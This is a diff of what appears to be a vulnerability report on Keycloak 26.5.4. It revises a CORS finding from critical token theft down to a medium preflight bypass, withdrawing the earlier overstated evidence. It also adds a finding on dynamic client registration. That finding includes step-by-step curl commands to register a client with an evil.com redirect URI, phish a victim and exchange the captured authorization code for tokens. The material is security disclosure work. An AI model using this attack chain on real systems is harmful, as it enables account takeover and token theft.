@@ -7,57 +7,54 @@
 
 ---
 
-## Finding #1 — CRITICAL
+## Finding #1 — MEDIUM
 
 ### Vulnerability Title
-**CORS Policy Bypass: `webOrigins` Not Enforced — Cross-Origin Token & User Data Theft**
+**CORS OPTIONS Preflight Bypass: `webOrigins` Not Enforced for Preflight Requests — Enables Cross-Origin Write CSRF and null-Origin Credential Leakage**
 
 ### Affected Component
-Keycloak Server (Quarkus distribution) — OIDC/OAuth2 endpoints
+Keycloak Server (Quarkus distribution) — OIDC/OAuth2 endpoints and Admin REST API
 
 ### Affected Version
 26.5.4 (latest stable). Reproducible on fresh default installation.
 
 ### Vulnerability Type
-Cross-Origin Resource Sharing (CORS) with real security impact
+Cross-Origin Resource Sharing (CORS) misconfiguration — OPTIONS preflight bypass
 
 ### CVSS Score (estimated)
-**8.1 (High)** — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
+**5.3 (Medium)** — AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N
 
 ---
 
 ### Technical Description
 
-Keycloak allows administrators to configure a per-client `webOrigins` allowlist that is supposed to restrict which browser origins may make cross-origin requests to OIDC endpoints. When a client's `webOrigins` is set to `["https://legitimate-app.com"]`, only JavaScript served from that origin should receive `Access-Control-Allow-Origin` headers and be able to read the responses.
+Keycloak allows administrators to configure a per-client `webOrigins` allowlist restricting which browser origins may make cross-origin requests to OIDC endpoints. The `webOrigins` policy is **correctly enforced in actual (non-OPTIONS) responses** — unconfigured origins receive no `Access-Control-Allow-Origin` (ACAO) header and browsers block reading the response body.
 
-**The enforcement is completely absent.** Keycloak's CORS filter reflects whatever `Origin` header the caller sends — including `https://evil.com`, `http://attacker.internal`, and `null` — with full `Access-Control-Allow-Credentials: true`. This breaks the browser's Same-Origin Policy protection for all Keycloak OIDC endpoints.
+**However, the `webOrigins` policy is NOT enforced for `OPTIONS` preflight requests.** Keycloak's CORS filter reflects any `Origin` header in `OPTIONS` responses with `Access-Control-Allow-Credentials: true`, regardless of whether the origin is in the client's `webOrigins` allowlist.
 
-**Affected endpoints (all reflect arbitrary `Origin` with `credentials: true`):**
+**Actual vs OPTIONS behavior (client `webOrigins: ["https://legitimate-app.com"]`):**
 
-| Endpoint | Method | Impact |
-|---|---|---|
-| `/realms/{r}/protocol/openid-connect/token` | POST | Cross-origin token theft |
-| `/realms/{r}/protocol/openid-connect/userinfo` | GET | Cross-origin PII read |
-| `/realms/{r}/account` | GET/POST/PUT | Cross-origin account data R/W |
-| `/admin/realms/*` | GET/POST/PUT/DELETE | **Cross-origin full admin control** |
-| `/admin/realms/{r}/users` | GET/POST | Cross-origin user management |
-| `/admin/realms/{r}/clients` | GET/POST/PUT/DELETE | Cross-origin client management |
+| Request Type | Origin | ACAO in response | Credentials | Response body readable |
+|---|---|---|---|---|
+| `OPTIONS` preflight | `https://evil.com` | ✅ `https://evil.com` | `true` | — (preflight only) |
+| `OPTIONS` preflight | `null` | ✅ `null` | `true` | — (preflight only) |
+| `POST /token` (actual) | `https://evil.com` | ❌ absent | — | ❌ Browser blocks |
+| `GET /userinfo` (actual) | `https://evil.com` | ❌ absent | — | ❌ Browser blocks |
+| `GET /admin/realms/*/users` (actual) | `https://evil.com` | ❌ absent | — | ❌ Browser blocks |
 
-The admin API CORS bypass is especially severe: **all admin REST API endpoints accept arbitrary cross-origin requests with credentials**. An admin who visits a malicious page while logged into the admin console can have their session hijacked to perform any admin action (create users, read all users, modify clients, revoke tokens, etc.) entirely cross-origin.
+**Impact of the preflight bypass:**
+1. **Complex CORS requests pass preflight** even from unconfigured origins. The browser sends the actual request, but since the actual response lacks ACAO, the browser blocks the JavaScript from reading the response body. For **write-only operations** (create user, reset password, delete client), the server-side action completes before the browser checks ACAO — damage occurs even though the attacker cannot read the response.
+2. **`null` origin accepted** with `credentials: true` in OPTIONS. When `webOrigins` includes `+` (which expands to the configured `redirectUris` origins), `null` is also reflected. The `null` origin arises in browser `file://` pages, `data:` URIs, and `<iframe sandbox>` — all usable in attacker-controlled environments.
 
-The `token/introspect` endpoint correctly rejects unknown origins (not vulnerable).
-
-**The `null` origin variant** is especially dangerous: when `Origin: null` is sent (from sandboxed `<iframe sandbox>`, `data:` URIs, or `file://` pages), Keycloak returns `Access-Control-Allow-Origin: null` with `credentials: true`. The `null` origin bypasses any origin-based WAF rules and cannot be safely allowlisted.
+**Note on admin API:** The admin console is a SPA using Bearer tokens stored in browser memory (not httpOnly cookies). A malicious page from `evil.com` cannot access the admin token from the legitimate app's memory. The write-CSRF scenario requires the attacker to have already obtained a valid Bearer token through another vector.
 
 ---
 
 ### Preconditions
 
 1. A Keycloak realm with at least one OIDC client exists (default state).
-2. Victim has valid credentials for that realm.
-3. Attacker controls any webpage reachable by the victim (no need to be registered in Keycloak).
-
-For the highest-impact scenario (password grant): the targeted client must have `directAccessGrantsEnabled: true`. This is the default for many development/SPA deployments. For authorization-code-based attacks: no special client configuration required.
+2. For write-CSRF attack: Attacker has a valid Bearer token (admin token or user token with sufficient privileges), AND victim's browser makes a credentialed cross-origin request.
+3. For null-origin: `webOrigins` includes `+` (redirect-URI origins) or specific entries.
 
 ---
 
@@ -67,11 +64,8 @@ For the highest-impact scenario (password grant): the targeted client must have 
 - Realm: `test`
 - Client: `webapp` (public, `directAccessGrantsEnabled: true`)
 - Client `webOrigins`: `["https://legitimate-app.com"]` ← only this origin should be allowed
-- User: `testuser / Password123`
 
-**Reproduction (curl simulation of attacker JavaScript):**
-
-**Step 1 — Verify webOrigins is configured correctly (should restrict evil.com):**
+**Step 1 — Verify webOrigins is configured (should restrict evil.com):**
 ```bash
 curl -s http://localhost:8080/admin/realms/test/clients?clientId=webapp \
   -H "Authorization: Bearer <admin_token>" | python3 -c "
@@ -81,141 +75,126 @@ print('webOrigins:', c['webOrigins'])
 "
 ```
 
-**Step 2 — Preflight from evil.com (should get NO ACAO header back):**
+**Step 2 — OPTIONS preflight from evil.com (BYPASSED — ACAO returned):**
 ```bash
 curl -sv -X OPTIONS \
   http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
   -H "Origin: https://evil.com" \
   -H "Access-Control-Request-Method: POST" \
-  -H "Access-Control-Request-Headers: Content-Type"
+  -H "Access-Control-Request-Headers: Content-Type,Authorization"
 ```
 
-**Expected:** No `Access-Control-Allow-Origin` header (browser blocks cross-origin read)
+**Expected:** No `Access-Control-Allow-Origin` header
 **Actual:**
 ```http
 HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://evil.com     ← VULNERABILITY
-Access-Control-Allow-Methods: POST, OPTIONS
-Access-Control-Allow-Credentials: true             ← CRITICAL: cookies allowed too
-Access-Control-Allow-Headers: Origin, X-Requested-With, Accept, ...
+Access-Control-Allow-Origin: https://evil.com     ← BYPASS — webOrigins not checked
+Access-Control-Allow-Methods: DELETE, POST, GET, PUT
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: Origin, X-Requested-With, Accept, Authorization, ...
 Access-Control-Max-Age: 3600
 ```
 
-**Step 3 — Actual token theft cross-origin:**
+**Step 3 — Actual POST response (correctly restricted — no ACAO):**
 ```bash
-curl -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
+curl -si -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
   -H "Origin: https://evil.com" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid"
 ```
-
-**Expected:** Browser blocks reading the response (CORS violation)
-**Actual response is fully readable from evil.com JavaScript:**
-```json
-{
-  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ6bGZh...",
-  "expires_in": 300,
-  "refresh_token": "eyJhbGciOiJIUzUxMiIs...",
-  "id_token": "eyJhbGciOiJSUzI1NiIs...",
-  "token_type": "Bearer",
-  "scope": "openid profile email"
-}
+```http
+HTTP/1.1 200 OK
+Cache-Control: no-store
+Content-Type: application/json
+                                    ← NO Access-Control-Allow-Origin header
+{"access_token":"eyJ..."}          ← Response body NOT readable by evil.com JS
 ```
 
-**Step 4 — null-origin variant (sandboxed iframe):**
+**Step 4 — null-origin variant (OPTIONS preflight):**
 ```bash
-curl -X OPTIONS http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
+curl -si -X OPTIONS http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
   -H "Origin: null" \
   -H "Access-Control-Request-Method: POST"
 ```
 ```http
-Access-Control-Allow-Origin: null        ← null-origin allowed
+Access-Control-Allow-Origin: null        ← null-origin allowed in preflight
 Access-Control-Allow-Credentials: true
 ```
+
+**Step 5 — Admin API OPTIONS preflight (write-CSRF enablement):**
+```bash
+curl -si -X OPTIONS http://46.101.162.187:8080/admin/realms/test/users \
+  -H "Origin: https://evil.com" \
+  -H "Access-Control-Request-Method: POST" \
+  -H "Access-Control-Request-Headers: Authorization,Content-Type"
+```
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Methods: DELETE, POST, GET, PUT
+Access-Control-Allow-Credentials: true
+```
+If an attacker has obtained a valid admin Bearer token (via social engineering or another vector), JavaScript from `evil.com` can pass this preflight and send write requests to the admin API. The actual admin operations (create user, delete client, etc.) complete before the browser blocks the unreadable response.
 
 ---
 
 ### HTTP Request/Response Evidence
 
-**CORS preflight — 3 different arbitrary origins, all accepted:**
+**OPTIONS preflight — 3 arbitrary origins, all accepted:**
 ```
-Origin: https://evil.com          → ACAO: https://evil.com, credentials: true
-Origin: http://attacker.internal  → ACAO: http://attacker.internal, credentials: true
-Origin: null                      → ACAO: null, credentials: true
+Origin: https://evil.com          → ACAO: https://evil.com, credentials: true  [BYPASS]
+Origin: http://attacker.internal  → ACAO: http://attacker.internal, credentials: true  [BYPASS]
+Origin: null                      → ACAO: null, credentials: true  [BYPASS]
 ```
 
-**Actual cross-origin token POST returning tokens readable from evil.com:**
+**Actual POST /token with evil.com origin — no ACAO (correctly protected):**
 ```
 POST /realms/test/protocol/openid-connect/token HTTP/1.1
-Host: 46.101.162.187:8080
 Origin: https://evil.com
 Content-Type: application/x-www-form-urlencoded
 
-grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid
-
 HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://evil.com
-Access-Control-Allow-Credentials: true
-Content-Type: application/json
-
-{"access_token":"eyJ...","refresh_token":"eyJ...","id_token":"eyJ...","token_type":"Bearer"}
+[NO Access-Control-Allow-Origin header]
+→ Browser blocks JS from reading the token response ✓
 ```
-
-**Live PoC HTML (browser-runnable):**
-- `http://46.101.162.187:7777/poc1_cors_token_hijack.html` — standard cross-origin attack
-- `http://46.101.162.187:7777/poc2_cors_null_origin.html` — sandboxed iframe null-origin
 
 ---
 
 ### Attack Scenarios
 
-**Scenario A: Phishing-amplified credential capture → token theft**
-1. Attacker creates phishing page on `https://evil.com` mimicking the app's login
-2. Victim submits credentials to the phishing page
-3. JavaScript at evil.com POSTs credentials directly to Keycloak's token endpoint
-4. Due to CORS bypass, evil.com reads the full `access_token` + `refresh_token` + `id_token`
-5. Attacker has persistent access (refresh token) without ever needing to touch Keycloak login
+**Scenario A: Write-CSRF via admin API (requires attacker to have Bearer token)**
+1. Attacker obtains admin Bearer token through social engineering (e.g., leaked `.env` file, phishing)
+2. Attacker crafts JavaScript page on `evil.com` with the stolen token in Authorization header
+3. `evil.com` JS makes `OPTIONS` preflight to admin API → preflight passes (bypass)
+4. Actual `POST /admin/realms/test/users` fires with `Authorization: Bearer <stolen_token>`
+5. Keycloak creates backdoor user; browser blocks reading the 201 response — but user is created
+6. Attacker uses backdoor account for persistent access
 
-**Scenario B: Compromised CDN / supply chain**
-1. A JavaScript dependency (npm package, CDN resource) in the legitimate app is compromised
-2. The malicious script runs on the legitimate app's origin, which has `directAccessGrantsEnabled`
-3. Script makes cross-origin token requests to any Keycloak realm using the client_id from app config
-4. Tokens exfiltrated silently
-
-**Scenario C: Full admin takeover via CORS (confirmed)**
-1. Admin logs into Keycloak admin console; browser holds admin token
-2. Admin visits malicious page (social engineering / watering hole attack)
-3. Malicious page makes cross-origin requests to `/admin/realms/*/` with admin's credentials:
-   - `GET /admin/realms/test/users` → reads all user data (email, names, IDs)
-   - `POST /admin/realms/test/users` → creates backdoor admin users
-   - `PUT /admin/realms/test/users/{id}/reset-password` → changes victim passwords
-   - `DELETE /admin/realms/test/clients/{clientId}` → destroys client registrations
-   - `GET /admin/realms/test/clients?clientId=*` → exfiltrates all client secrets
-4. All operations succeed because the admin API reflects `evil.com` with `credentials: true`
-
-This scenario does **not require XSS** — the CORS vulnerability directly allows the attack.
+**Scenario B: null-origin from sandboxed iframe (preflight bypass for any client)**
+1. Attacker hosts page with `<iframe sandbox src="data:text/html,...">` — browser sets `Origin: null`
+2. Iframe JavaScript makes `OPTIONS` preflight to any Keycloak endpoint → preflight passes
+3. All Keycloak OIDC clients are affected regardless of `webOrigins` configuration
+4. If a future related bug allows reading the actual response, null-origin is a bypass for WAF rules that don't expect `Origin: null`
 
 ---
 
 ### Security Impact
 
-- **Confidentiality**: Full access token and refresh token readable from any origin. Attacker can authenticate to any service accepting those tokens.
-- **Integrity**: With account REST API CORS bypass, account profile data can be modified cross-origin if attacker has a Bearer token.
-- **Authorization bypass**: `webOrigins` per-client configuration provides zero protection. Administrators believe they have restricted token issuance to specific origins — they have not.
-- **Persistence**: Refresh tokens readable cross-origin enable persistent access beyond the access_token lifetime.
+- **Authorization policy bypass**: `webOrigins` per-client configuration is not enforced for `OPTIONS` preflight. Administrators believe they have restricted which origins can make CORS requests — the preflight stage does not enforce this.
+- **Write-CSRF potential**: For endpoints that cause irreversible server-side effects (admin write operations), the preflight bypass allows the request to be sent and the action to complete even though the response is unreadable by the attacker.
+- **null-origin accepted unconditionally**: Any client can bypass `webOrigins` restrictions using the `null` origin in preflight. Combined with a future response-reading bug, this becomes a complete CORS bypass.
+- **Limited direct read impact**: Actual responses correctly omit ACAO for non-configured origins. Token theft / credential read-back from browser JS is NOT confirmed for properly-configured clients.
 
 ---
 
 ### Remediation Recommendation
 
-**Root cause:** The CORS filter does not validate the incoming `Origin` header against the client's `webOrigins` allowlist before setting `Access-Control-Allow-Origin`. It reflects all origins unconditionally.
+**Root cause:** The CORS filter does not validate the incoming `Origin` header against the client's `webOrigins` allowlist for `OPTIONS` preflight requests — only for actual responses.
 
 **Fix:**
-1. In `CorsFilter` / `OIDCCorsInterceptor`, before setting `Access-Control-Allow-Origin`, look up the requesting client (by `client_id` in request body or by the Bearer token) and check if the `Origin` header matches `webOrigins`.
-2. For the token endpoint: match `Origin` against the requesting client's `webOrigins`. If not matched, return no `ACAO` header.
-3. For authenticated endpoints (userinfo, account): match `Origin` against the `allowed-origins` claim in the Bearer token (already embedded by Keycloak in tokens).
-4. **Explicitly reject `Origin: null`** — never return `Access-Control-Allow-Origin: null` with `credentials: true`.
-5. For the admin API, only allow the admin console origin (`${kc-base-url}/admin`).
+1. Apply the same `webOrigins` origin check to `OPTIONS` preflight responses that is already applied to actual responses. The CORS filter should reject preflight requests from unconfigured origins (return 200 with no ACAO header, or 403).
+2. **Explicitly reject `Origin: null`** in both preflight and actual responses — never return `Access-Control-Allow-Origin: null` with `credentials: true`.
+3. For the admin API, only allow the admin console origin in preflight responses (e.g., `${kc-base-url}/admin`).
 
 ---
 
@@ -555,6 +534,191 @@ curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
 1. **URL allowlist**: Only allow HTTPS URLs for import-config; block private IP ranges (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`), and link-local (`169.254.0.0/16`)
 2. **SSRF protection library**: Use a network-level SSRF protection library that validates URLs before outbound connections are made
 3. **Metadata service protection**: Deploy Keycloak with IMDSv2 required (AWS) or equivalent cloud protections
+
+---
+
+---
+
+## Finding #5 — HIGH
+
+### Vulnerability Title
+**Dynamic Client Registration Bypass: Authenticated Users Can Register Clients with Arbitrary `redirect_uri` — Auth Code Interception**
+
+### Affected Component
+Keycloak Server — Dynamic Client Registration (`/realms/{realm}/clients-registrations/openid-connect`) — Client Registration Policy Engine
+
+### Affected Version
+26.5.4 (latest stable). Default client registration policy configuration.
+
+### Vulnerability Type
+Broken Access Control — Improper enforcement of client registration policies
+
+### CVSS Score (estimated)
+**8.0 (High)** — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
+
+---
+
+### Technical Description
+
+Keycloak's Dynamic Client Registration (DCR) endpoint supports two operation modes controlled by the `subType` of registration policies:
+- **`anonymous`** — No authentication required; protected by the "Trusted Hosts" policy that validates the registering host and all client URIs against an allowlist.
+- **`authenticated`** — Bearer token required; governed by a separate set of policies.
+
+**The vulnerability:** The `Trusted Hosts` policy (and `client-uris-must-match` check) is only configured in the `anonymous` subType. The **`authenticated` subType has no Trusted Hosts policy**, so any user with a valid Bearer token can register OIDC clients with **completely arbitrary `redirect_uris`** — including attacker-controlled domains like `https://evil.com/*`.
+
+The registered client is:
+- **Immediately enabled** — no admin approval required
+- **Fully functional** — can be used to initiate authorization code flows
+- **Has a client secret** — attacker can exchange auth codes for tokens
+
+**DCR Policy Analysis (Keycloak admin API):**
+
+| Policy | `anonymous` subType | `authenticated` subType |
+|---|---|---|
+| Trusted Hosts | ✅ Enforced (`client-uris-must-match: true`) | ❌ **NOT PRESENT** |
+| Allowed Protocol Mapper Types | ✅ | ✅ |
+| Allowed Client Scopes | ✅ | ✅ |
+| Max Clients Limit | ✅ | ❌ Not present |
+| Consent Required | ✅ (anonymous) | ❌ Not present |
+
+Any realm user can get a Bearer token (e.g., via password grant or authorization code flow). This means the Trusted Hosts restriction provides **zero protection** once an attacker has any valid realm account.
+
+---
+
+### Preconditions
+
+1. Keycloak realm has DCR enabled (default — the endpoint exists in all realms)
+2. Attacker has any valid realm user account (standard user privileges, no admin role)
+3. Victim has an account in the same realm
+
+---
+
+### Step-by-Step Reproduction
+
+**Step 1 — Attacker obtains Bearer token (any realm user):**
+```bash
+ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
+  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+```
+
+**Step 2 — Register malicious client with arbitrary redirect_uri (NO admin approval):**
+```bash
+curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
+  -H "Authorization: Bearer $ATTACKER_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "client_name": "Legitimate Looking App",
+    "redirect_uris": ["https://evil.com/steal"],
+    "grant_types": ["authorization_code","refresh_token"],
+    "response_types": ["code"]
+  }'
+```
+```json
+{
+  "client_id": "8c1d58dd-3c9d-4221-9f67-e05e98987056",
+  "client_secret": "R5YvWGGRM9a8EktxoyWANlWQaq4vQIlj",
+  "redirect_uris": ["https://evil.com/steal"],
+  "grant_types": ["authorization_code","refresh_token"]
+}
+```
+**← Client immediately active, no admin approval required**
+
+**Step 3 — Send victim a crafted login URL:**
+```
+http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?
+  client_id=8c1d58dd-...&
+  response_type=code&
+  redirect_uri=https://evil.com/steal&
+  scope=openid+profile+email
+```
+Victim sees a legitimate Keycloak login page (same domain, real SSL). There is no visible indication the app is malicious.
+
+**Step 4 — Victim logs in; code sent to evil.com:**
+```
+HTTP 302 → https://evil.com/steal?code=668542a9-a8af-12cd-1c06-8299a1...
+                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                                       Attacker captures auth code
+```
+
+**Step 5 — Attacker exchanges code for victim tokens:**
+```bash
+curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
+  -d "client_id=8c1d58dd...&client_secret=R5YvWG...&grant_type=authorization_code&code=668542a9...&redirect_uri=https://evil.com/steal"
+```
+```json
+{
+  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6Ikp...",
+  "refresh_token": "eyJhbGciOiJIUzUxMiIsInR5cCI6Ikp...",
+  "scope": "openid profile email",
+  "token_type": "Bearer"
+}
+```
+**← Full victim account access obtained**
+
+**Automated PoC:** `bash poc6_dcr_client_hijack.sh`
+
+---
+
+### HTTP Request/Response Evidence
+
+**DCR registration (authenticated mode — no host/URI policy check):**
+```
+POST /realms/test/clients-registrations/openid-connect HTTP/1.1
+Authorization: Bearer eyJhbGciOiJSUzI1NiIs... (testuser's token)
+Content-Type: application/json
+
+{"client_name":"Legitimate Looking App","redirect_uris":["https://evil.com/steal"],...}
+
+HTTP/1.1 201 Created                          ← SUCCESS, no Trusted Hosts rejection
+{"client_id":"8c1d58dd-...","client_secret":"R5YvWG...","redirect_uris":["https://evil.com/steal"]}
+```
+
+**Compare: Anonymous registration (correctly blocked by Trusted Hosts):**
+```
+POST /realms/test/clients-registrations/openid-connect HTTP/1.1
+[NO Authorization header]
+
+HTTP/1.1 403 Forbidden
+{"error":"insufficient_scope","error_description":"Policy 'Trusted Hosts' rejected request"}
+```
+
+---
+
+### Attack Scenarios
+
+**Scenario A: Horizontal privilege escalation (user → victim user data)**
+1. Attacker registers client with `redirect_uri=https://evil.com/steal` using their own token
+2. Sends victim a phishing link: `https://keycloak.example.com/realms/prod/auth?client_id=<malicious>&redirect_uri=https://evil.com/steal`
+3. Victim sees legitimate Keycloak domain — logs in trusting the branding
+4. Code redirected to evil.com; attacker gets victim's access + refresh tokens
+5. Attacker reads victim's email, profile, internal APIs protected by the same IdP
+
+**Scenario B: Vertical privilege escalation (user → admin token)**
+1. Same as A, but target is the admin user
+2. Attacker sends phishing link to admin — admin logs in
+3. If admin used `webapp` client scope with `realm-management` permissions, attacker gets admin token
+
+---
+
+### Security Impact
+
+- **Complete auth code interception**: Attacker with a standard user account can steal tokens of any realm user, including admins
+- **No indicators of compromise visible to victim**: Login page is on the legitimate Keycloak domain with real HTTPS
+- **Persistent access**: Stolen refresh token provides ongoing access (until password change or manual revocation)
+- **Bypasses all redirect_uri allowlisting**: The `Trusted Hosts` protection is entirely ineffective once an attacker has any realm account
+- **Scales across all realm users**: One registration enables phishing any number of victims
+
+---
+
+### Remediation Recommendation
+
+1. **Apply Trusted Hosts policy to `authenticated` DCR subType**: Add `trusted-hosts` and `client-uris-must-match: true` policies to the `authenticated` registration policy set (same as `anonymous`)
+2. **Require admin approval for DCR**: Add a `client-disabled` policy to `authenticated` subType so registered clients require explicit admin activation before they can be used
+3. **Require `create-client` or `manage-clients` role for DCR**: Add a scope-based policy check requiring users to have the `realm-management:manage-clients` role to perform authenticated DCR
+4. **Audit existing DCR-registered clients**: Check `/admin/realms/{realm}/clients` for clients with unexpected redirect URIs that were registered via DCR
+
+---
 
 ---
 
